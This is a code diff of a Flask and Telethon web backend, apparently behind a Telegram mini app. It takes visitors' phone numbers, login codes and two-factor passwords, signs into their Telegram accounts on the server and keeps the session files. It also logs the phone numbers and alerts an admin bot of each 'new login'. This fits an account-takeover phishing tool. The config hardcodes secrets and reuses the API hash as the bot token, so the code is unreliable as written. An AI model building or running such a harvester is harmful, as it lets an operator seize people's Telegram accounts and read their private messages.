@@ -1,36 +1,47 @@
+
+API_ID = 25780325
+API_HASH = "2c4cb6eee01a46dc648114813042c453"
+
 import os
 import asyncio
 from flask import Flask, request, jsonify, render_template
-from telethon import TelegramClient
-from telethon.errors import PhoneCodeInvalidError, SessionPasswordNeededError
+from telethon.sync import TelegramClient
+from telethon.errors import (
+    PhoneCodeInvalidError,
+    SessionPasswordNeededError,
+    FloodWaitError,
+    PhoneNumberInvalidError
+)
+from aiogram import Bot
+from database import get_db, init_db
 
-# =========================
+# ======================
 # CONFIG
-# =========================
+# ======================
 API_ID = 25780325
 API_HASH = "2c4cb6eee01a46dc648114813042c453"
+BOT_TOKEN = "2c4cb6eee01a46dc648114813042c453"
+ADMIN_ID = 515902673  # admin bot user id
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
 os.makedirs(SESSIONS_DIR, exist_ok=True)
 
-# phone -> {client, hash}
-pending = {}
+bot = Bot(BOT_TOKEN)
 
 app = Flask(__name__, template_folder="templates")
+
+init_db()
+
+# phone -> {client, hash}
+pending = {}
 
 def session_path(phone):
     return os.path.join(SESSIONS_DIR, phone.replace("+", ""))
 
-def run_async(coro):
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    result = loop.run_until_complete(coro)
-    return loop, result
-
-# =========================
+# ======================
 # ROUTES
-# =========================
+# ======================
 
 @app.route("/")
 def index():
@@ -42,28 +53,39 @@ def miniapp():
 
 @app.route("/send_code", methods=["POST"])
 def send_code():
-    data = request.get_json(force=True)
+    data = request.json
     phone = data.get("phone")
 
-    if not phone:
-        return jsonify({"status": "phone_required"})
+    try:
+        if phone in pending:
+            pending[phone]["client"].disconnect()
+            pending.pop(phone)
 
-    client = TelegramClient(session_path(phone), API_ID, API_HASH)
+        client = TelegramClient(session_path(phone), API_ID, API_HASH)
+        client.connect()
 
-    loop, _ = run_async(client.connect())
-    result = loop.run_until_complete(client.send_code_request(phone))
+        sent = client.send_code_request(phone)
 
-    pending[phone] = {
-        "client": client,
-        "hash": result.phone_code_hash,
-        "loop": loop
-    }
+        pending[phone] = {
+            "client": client,
+            "hash": sent.phone_code_hash
+        }
 
-    return jsonify({"status": "code_sent"})
+        return jsonify({"status": "code_sent"})
+
+    except FloodWaitError as e:
+        return jsonify({"status": "flood_wait", "seconds": e.seconds})
+
+    except PhoneNumberInvalidError:
+        return jsonify({"status": "phone_invalid"})
+
+    except Exception as e:
+        print("SEND CODE ERROR:", e)
+        return jsonify({"status": "error"})
 
 @app.route("/verify_code", methods=["POST"])
 def verify_code():
-    data = request.get_json(force=True)
+    data = request.json
     phone = data.get("phone")
     code = data.get("code")
 
@@ -72,54 +94,22 @@ def verify_code():
 
     client = pending[phone]["client"]
     phone_hash = pending[phone]["hash"]
-    loop = pending[phone]["loop"]
 
     try:
-        loop.run_until_complete(
-            client.sign_in(phone=phone, code=code, phone_code_hash=phone_hash)
-        )
+        client.sign_in(phone=phone, code=code, phone_code_hash=phone_hash)
     except PhoneCodeInvalidError:
         return jsonify({"status": "invalid_code"})
     except SessionPasswordNeededError:
         return jsonify({"status": "2fa_required"})
+    except Exception as e:
+        print("VERIFY ERROR:", e)
+        return jsonify({"status": "error"})
 
-    me = loop.run_until_complete(client.get_me())
-
-    loop.run_until_complete(client.disconnect())
-    loop.close()
-    pending.pop(phone)
-
-    return jsonify({
-        "status": "success",
-        "user_id": me.id,
-        "username": me.username
-    })
-
-me = client.get_me()
-user_id = me.id
-
-from database import get_db
-conn = get_db()
-cur = conn.cursor()
-
-cur.execute(
-    """
-    INSERT INTO authorized_users (user_id, phone)
-    VALUES (%s, %s)
-    ON CONFLICT (user_id) DO UPDATE
-    SET phone = EXCLUDED.phone
-    """,
-    (user_id, phone)
-)
-
-conn.commit()
-cur.close()
-conn.close()
-
+    return finalize_login(client, phone)
 
 @app.route("/verify_password", methods=["POST"])
 def verify_password():
-    data = request.get_json(force=True)
+    data = request.json
     phone = data.get("phone")
     password = data.get("password")
 
@@ -127,50 +117,46 @@ def verify_password():
         return jsonify({"status": "no_session"})
 
     client = pending[phone]["client"]
-    loop = pending[phone]["loop"]
 
     try:
-        loop.run_until_complete(client.sign_in(password=password))
+        client.sign_in(password=password)
     except Exception:
         return jsonify({"status": "invalid_password"})
 
-    me = loop.run_until_complete(client.get_me())
+    return finalize_login(client, phone)
 
-    loop.run_until_complete(client.disconnect())
-    loop.close()
-    pending.pop(phone)
+# ======================
+# FINAL LOGIN
+# ======================
 
-    return jsonify({
-        "status": "success",
-        "user_id": me.id
-    })
+def finalize_login(client, phone):
+    me = client.get_me()
+    user_id = str(me.id)
 
-me = client.get_me()
-user_id = me.id
+    conn = get_db()
+    cur = conn.cursor()
+    cur.execute("""
+        INSERT OR REPLACE INTO authorized_users (user_id, phone)
+        VALUES (?, ?)
+    """, (user_id, phone))
+    conn.commit()
+    conn.close()
 
-conn = get_db()
-cur = conn.cursor()
+    asyncio.run(
+        bot.send_message(
+            ADMIN_ID,
+            f"✅ Yangi login\n👤 ID: {user_id}\n📞 {phone}"
+        )
+    )
 
-cur.execute(
-    """
-    INSERT INTO authorized_users (user_id, phone)
-    VALUES (%s, %s)
-    ON CONFLICT (user_id) DO UPDATE
-    SET phone = EXCLUDED.phone
-    """,
-    (user_id, phone)
-)
+    client.disconnect()
+    pending.pop(phone, None)
 
-conn.commit()
-cur.close()
-conn.close()
+    return jsonify({"status": "success"})
 
-
-
-# =========================
+# ======================
 # RUN
-# =========================
+# ======================
+
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
-
-
